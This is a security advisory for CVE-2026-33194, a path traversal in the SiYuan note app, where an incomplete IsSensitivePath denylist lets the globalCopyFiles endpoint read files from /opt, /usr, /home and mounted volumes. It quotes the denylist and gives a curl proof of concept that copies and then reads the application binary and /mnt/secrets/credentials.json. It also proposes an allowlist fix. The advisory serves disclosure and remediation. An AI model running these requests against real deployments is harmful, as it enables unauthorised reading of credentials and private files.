# [M] SiYuan has an Incomplete Fix for IsSensitivePath Denylist Allows File Read from /opt, /usr, /home (GHSA-h5vh-m7fg-w5h6 Bypass)

## Summary
Severity: Medium
Advisory: GHSA-vm69-h85x-8p85
CVE: CVE-2026-33194
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-vm69-h85x-8p85
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <3.6.2

## Details
## Summary

The `IsSensitivePath()` function in `kernel/util/path.go` uses a denylist approach that was recently expanded (GHSA-h5vh-m7fg-w5h6, commit 9914fd1) but remains incomplete. Multiple security-relevant Linux directories are not blocked, including `/opt` (application data), `/usr` (local configs/binaries), `/home` (other users), `/mnt` and `/media` (mounted volumes). The `globalCopyFiles` and `importStdMd` endpoints rely on `IsSensitivePath` as their primary defense against reading files outside the workspace.

## Details

Current denylist in `kernel/util/path.go:391-405`:

```go
prefixes := []string{
    "/.",       // dotfiles
    "/etc",     // system config
    "/root",    // root home
    "/var",     // variable data
    "/proc",    // process info
    "/sys",     // sysfs
    "/run",     // runtime data
    "/bin",     // binaries
    "/boot",    // boot files
    "/dev",     // devices
    "/lib",     // libraries
    "/srv",     // service data
    "/tmp",     // temp files
}
```

**NOT blocked:**
- `/opt` — commonly contains application data, databases, credentials. In SiYuan Docker, `/opt/siyuan/` contains the application itself.
- `/usr` — contains `/usr/local/etc`, `/usr/local/share`, custom configs
- `/home` — other users' home directories (only `~/.ssh` and `~/.config` of the current HomeDir are blocked via separate checks, but other users' homes are accessible)
- `/mnt`, `/media` — mounted volumes, network shares, often containing secrets
- `/snap` — snap package data
- `/sbin`, `/lib64` — system binaries/libraries

The `globalCopyFiles` endpoint at `kernel/api/file.go:82` uses `IsSensitivePath` as its sole path validation:

```go
if util.IsSensitivePath(absSrc) {
    // reject
    continue
}
// File is copied into workspace — then readable via /api/file/getFile
```

## PoC

```bash
# Read SiYuan's own application files from /opt (Docker deployment)
curl -s 'http://127.0.0.1:6806/api/file/globalCopyFiles' \
  -H 'Authorization: Token YOUR_API_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"srcs":["/opt/siyuan/kernel/SiYuan-Kernel"],"destDir":"data/assets"}'

# Then read the copied file from workspace
curl -s 'http://127.0.0.1:6806/api/file/getFile' \
  -H 'Authorization: Token YOUR_API_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"path":"data/assets/SiYuan-Kernel"}'

# Read files from mounted volumes
curl -s 'http://127.0.0.1:6806/api/file/globalCopyFiles' \
  -H 'Authorization: Token YOUR_API_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"srcs":["/mnt/secrets/credentials.json"],"destDir":"data/assets"}'
```

## Impact

- Read arbitrary files from `/opt`, `/usr`, `/home`, `/mnt`, `/media` and any other non-denylisted path
- In Docker deployments: read application source code, configs, mounted secrets
- The denylist approach is fundamentally flawed — any newly added filesystem path is accessible until explicitly blocked

## Recommended Fix

Switch from a denylist to an allowlist approach. Only permit copying from the workspace directory and explicitly approved external paths:

```go
func IsSensitivePath(p string) bool {
    absPath := filepath.Clean(p)

    // Allowlist: only workspace and configured safe directories
    if strings.HasPrefix(absPath, WorkspaceDir) {
        // Block workspace-internal sensitive paths (conf/)
        if strings.HasPrefix(absPath, filepath.Join(WorkspaceDir, "conf")) {
            return true
        }
        return false
    }

    // Everything outside workspace is sensitive by default
    return true
}
```

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-vm69-h85x-8p85
- https://nvd.nist.gov/vuln/detail/CVE-2026-33194
- https://github.com/siyuan-note/siyuan
